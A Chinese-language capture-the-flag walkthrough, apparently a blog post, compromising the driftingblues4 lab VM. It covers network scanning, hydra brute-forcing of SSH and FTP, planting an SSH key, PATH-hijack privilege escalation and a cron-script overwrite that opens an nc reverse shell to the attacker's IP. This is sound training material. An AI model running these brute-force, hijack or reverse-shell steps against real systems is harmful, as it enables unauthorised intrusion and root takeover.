#  driftingblues4   
原创 王之暴龙战神  王之暴龙战神   2025-03-03 06:18  
  
攻击者ip：192.168.56.108 桥接（自动） vmare  
  
受害者ip：1192.168.56.126 仅主机 vxbox  
  
            
  
            
  
主机发现  
  
arp-scan -l  
  
方法一、arp-scan -I eth0 -l （指定网卡扫）  
            
  
              
  
方法二、masscan 扫描的网段 -p 扫描端口号  
            
  
              
  
masscan 192.168.184.0/24 -p 80,22  
            
  
方法三、netdiscover -i 网卡-r 网段  
            
  
              
  
netdiscover -i eth0 -r 192.168.184.0/24  
  
![](https://mmbiz.qpic.cn/mmbiz_png/KCOWlp56gVDaOgPHwicJ0AHse4X5U8KbZ8yvdibDdpGibYe2ghibkQknVYiaXib3v4uTOfjOiaYqpXQrFGHnShzlic8Kcw/640?wx_fmt=png "")  
  
            
  
            
  
端口扫描  
  
nmap -p- -sV 192.168.56.126   
      
  
![](https://mmbiz.qpic.cn/mmbiz_png/KCOWlp56gVDaOgPHwicJ0AHse4X5U8KbZ4SYGFaTBInwYKGeFWZGicZIOvOqeD762Zl5ERxDrdicaWzP1HOPmuiaLw/640?wx_fmt=png "")  
  
            
  
            
  
21ftp匿名登陆失败  
  
![](https://mmbiz.qpic.cn/mmbiz_png/KCOWlp56gVDaOgPHwicJ0AHse4X5U8KbZZuI1RzSfMtWZpHvsbFjq8doFOj2ib8ub83tcdMYuk3obCbU4rHJ5zJw/640?wx_fmt=png "")  
  
            
  
爆目录，空的  
      
  
![](https://mmbiz.qpic.cn/mmbiz_png/KCOWlp56gVDaOgPHwicJ0AHse4X5U8KbZCUwcM0C9mfTemfWdawbxzc2PuEMkZu3Wv5H1iaCDeRrzvW3jS8iavX8g/640?wx_fmt=png "")  
  
            
  
查看源代码，发现base64编码  
  
解码，  
  
![](https://mmbiz.qpic.cn/mmbiz_png/KCOWlp56gVDaOgPHwicJ0AHse4X5U8KbZogAiaYRE8QuEE9Q16cjibxlJaFA2WTfpOQ7Q6X07miadibZzW8b1y3bzibA/640?wx_fmt=png "")  
  
      
  
            
  
            
  
            
  
            
  
接着解码  
  
imfuckingmad.txt  
  
https://ctf.bugku.com/tool/brainfuck  
  
![](https://mmbiz.qpic.cn/mmbiz_png/KCOWlp56gVDaOgPHwicJ0AHse4X5U8KbZIAlu0m5KIbdJYkPpCTPgic2T5GHUL2QjwtCE7aUZwHsWSiapXlRDsYQA/640?wx_fmt=png "")  
  
      
  
![](https://mmbiz.qpic.cn/mmbiz_png/KCOWlp56gVDaOgPHwicJ0AHse4X5U8KbZ0hVdOISuCLVfibhIYfymnf8nJzVqGSrh3icg4M4w1CtAZjqaMx1aTpFg/640?wx_fmt=png "")  
  
            
  
            
  
扫描二维码，跳转到  
https://i.imgur.com/a4JjS76.png  
，但是网站凉了  
      
  
![](https://mmbiz.qpic.cn/mmbiz_png/KCOWlp56gVDaOgPHwicJ0AHse4X5U8KbZJ7tPgUGI52lSyvGFWFMGwfCibwtQskf3nBWaicXUSprDwAP5jLQjdU4w/640?wx_fmt=png "")  
  
            
  
            
  
看wp的图片  
  
得到用户名  
  
luther  
            
  
gary  
            
  
Hubert  
            
  
clark  
  
      
  
![](https://mmbiz.qpic.cn/mmbiz_png/KCOWlp56gVDaOgPHwicJ0AHse4X5U8KbZcWKLJibAlsnslKYsVKWe5vT0rvC6LwicYQ4rRTFduj6SPXEx61wibs9ibA/640?wx_fmt=png "")  
  
            
  
            
  
            
  
            
  
爆破ssh  
  
hydra -L use.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.126  
      
  
![](https://mmbiz.qpic.cn/mmbiz_png/KCOWlp56gVDaOgPHwicJ0AHse4X5U8KbZibXCG9En8dPJLPgnOPqf2Ax4ydwibhtZ33SCKZfQXXknX03BfQIqHVIA/640?wx_fmt=png "")  
  
            
  
            
  
hydra -L use.txt -P /usr/share/wordlists/rockyou.txt ftp://192.168.56.126  
  
参数：  
            
  
-l login 小写，指定用户名进行破解  
            
  
-L file 大写，指定用户的用户名字典  
            
  
-p pass 小写，用于指定密码破解，很少使用，一般采用密码字典。  
            
  
-P file 大写，用于指定密码字典。  
            
  
-e ns 额外的选项，n：空密码试探，s：使用指定账户和密码试探  
            
  
-M file 指定目标ip列表文件，批量破解。  
            
  
-o file 指定结果输出文件  
            
  
-f 找到第一对登录名或者密码的时候中止破解。  
            
  
-t tasks 同时运行的线程数，默认是16  
            
  
-w time 设置最大超时时间，单位  
            
  
-v / -V 显示详细过程  
            
  
-R 恢复爆破（如果破解中断了，下次执行 hydra -R /path/to/hydra.restore 就可以继续任务。）  
            
  
-x 自定义密码。  
  
luther/mypics  
  
![](https://mmbiz.qpic.cn/mmbiz_png/KCOWlp56gVDaOgPHwicJ0AHse4X5U8KbZp6Qq03Z2OR01KpLYZ7XUfI0L2Q7ib3E9WVCWKGkAOAQcB5BW8Nmib9Hw/640?wx_fmt=png "")  
  
            
  
            
  
连接ftp  
      
  
   
ftp  
            
  
 ls：列出当前目录中的文件和子目录。  
            
  
 cd：切换到指定的目录  
            
  
 get：从服务器下载文件到本地计算机。  
            
  
 put：将本地文件上传到服务器。  
            
  
 delete：删除服务器上的文件。  
            
  
 mkdir：在服务器上创建新目录。  
            
  
 quit/bye/exit：断开 FTP 连接并退出。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/KCOWlp56gVDaOgPHwicJ0AHse4X5U8KbZFxb48rCFWrUNXV5qzpeY9pWE3bmiaLD3xLLaMX6LDcTb9AADeOumWibQ/640?wx_fmt=png "")  
  
            
  
            
  
没啥东西  
  
![](https://mmbiz.qpic.cn/mmbiz_png/KCOWlp56gVDaOgPHwicJ0AHse4X5U8KbZ3UTNeYicLmj5R17JnOJpibjBZDmdic8BcZnxYCbXJ2NpUjUTeRJ5lQAMQ/640?wx_fmt=png "")  
  
      
  
            
  
            
  
hubert的uid与其他不一样是1001，这可能是一个用户文件夹  
  
但是里边没有其他东西，连.ssh都没有，可以利用该文件夹，在本地生成秘钥，上传到靶机里  
  
然后可以尝试使用秘钥登录靶机  
  
ssh-keygen 生成密钥  
  
![](https://mmbiz.qpic.cn/mmbiz_png/KCOWlp56gVDaOgPHwicJ0AHse4X5U8KbZkhQTvPPav7zU2Bicpib4Y2OaMibMm5b9qBYsAia21X5RoAOASdEiaez9pSw/640?wx_fmt=png "")  
  
            
  
给用户hubert创建.ssh目录，并将authorized_keys塞到里面，给权限  
      
  
![](https://mmbiz.qpic.cn/mmbiz_png/KCOWlp56gVDaOgPHwicJ0AHse4X5U8KbZ1ReVKSLZ21kIKRsohbMolR74treJDy6XOYliczEfRs8SC7ahpiczfWvA/640?wx_fmt=png "")  
  
            
  
ssh连接获得第一个flag  
  
ssh hubert@192.168.56.126 -i id_rsa  
  
![](https://mmbiz.qpic.cn/mmbiz_png/KCOWlp56gVDaOgPHwicJ0AHse4X5U8KbZia9EmNzIpEmgibDlRKfTBYkPtnJtH8pwszWMIKQibakiaFsfOclTxBWp8Q/640?wx_fmt=png "")  
  
      
  
            
  
            
  
            
  
查看py文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/KCOWlp56gVDaOgPHwicJ0AHse4X5U8KbZRzzAKx6ylpiagMaDQfOtibCtKb6wfhRSnQyUveII7F1mbWaPnENYtJAg/640?wx_fmt=png "")  
  
            
  
            
  
提权  
  
   
find / -perm -u=s -type f 2>/dev/null  
      
  
发现getinfo  
  
![](https://mmbiz.qpic.cn/mmbiz_png/KCOWlp56gVDaOgPHwicJ0AHse4X5U8KbZV4EVeMOxlJZvAkoqsLKKtU3WK68ibM9UfReib0fO1EchRyfr8J5Y2zQw/640?wx_fmt=png "")  
  
            
  
            
  
执行了 ip addr, cat /etc/hosts, uname -a  
  
可以修改其中一个命令即可获得root权限  
  
![](https://mmbiz.qpic.cn/mmbiz_png/KCOWlp56gVDaOgPHwicJ0AHse4X5U8KbZUZRrgFDGBPWsGmHMJFGtiaiaXibFI5I3kFXT3EeS8Wyz0BPpTeeiapH0lQ/640?wx_fmt=png "")  
  
            
  
      
  
环境变量命令劫持提权  
  
大概的原理就是 执行系统命令所以我们可以自行编写一个同名文件，  
            
  
比如说cat，因为我们猜测getinfo中使用了cat命令，如若我们可以添加环境变量，getinfo在调用命令时首先检索环境变量就会调用到我们伪造的cat，执行我们想要的命令，来达到提权的效果，即使用环境变量进行命令劫持提权  
            
  
              
  
              
  
因此，在这种情况下，我们可以在环境变量 PATH 中提供一个目录 (/tmp)，并创建一  
            
  
个 ip 或者 cat 文件，用于劫持命令，执行我们自定义的二进制文件就可以提权：  
            
  
export PATH=/tmp/:$PATH  
       
//把/tmp路径加入到系统路径中。  
            
  
cd /tmp  
             
             
             
             
             
             
            
  
echo '/bin/bash' > ip  
             
             
//把/bin/bash写入到ip中。  
            
  
chmod +x ip  
             
             
             
             
             
//增加执行权限  
            
  
/usr/bin/getinfo  
  
![](https://mmbiz.qpic.cn/mmbiz_png/KCOWlp56gVDaOgPHwicJ0AHse4X5U8KbZv1zdL3Anjfwljn1ibYUPnZsiavicibpNYsTMNTia1XYswzQy8ZfDlxvDib2Q/640?wx_fmt=png "")  
  
            
  
计划任务提权  
      
  
上传pspy  
  
![](https://mmbiz.qpic.cn/mmbiz_png/KCOWlp56gVDaOgPHwicJ0AHse4X5U8KbZb3yymC2554FjeeW6Vl5vibWqtSCoYPnXcdaZicT6EGGYy4AZJvG2XTlQ/640?wx_fmt=png "")  
  
            
  
发现隔了一分钟的emergency.py  
  
![](https://mmbiz.qpic.cn/mmbiz_png/KCOWlp56gVDaOgPHwicJ0AHse4X5U8KbZAfuE5aAaMaFOlm1baQuH9lnzNpIibzRXOrXDnHJ8NPI0meopicIHFZkg/640?wx_fmt=png "")  
  
            
  
            
  
      
  
删除并新建  
  
#!/usr/bin/python  
            
  
import os  
            
  
              
  
os.system('nc -e /bin/bash 192.168.56.108 1111')  
  
![](https://mmbiz.qpic.cn/mmbiz_png/KCOWlp56gVDaOgPHwicJ0AHse4X5U8KbZoDvBohpS5NOHeFPA6TtLCNcjOOsyspn9Giaou2ILeY5Cm3HicO86FLqQ/640?wx_fmt=png "")  
  
            
  
提权成功  
      
  
![](https://mmbiz.qpic.cn/mmbiz_png/KCOWlp56gVDaOgPHwicJ0AHse4X5U8KbZvMsom6T1mHPoD2opM4qXRvibic2taTwtzdgZ3T1J2gE9B2OWp8WyHStg/640?wx_fmt=png "")  
  
      
  
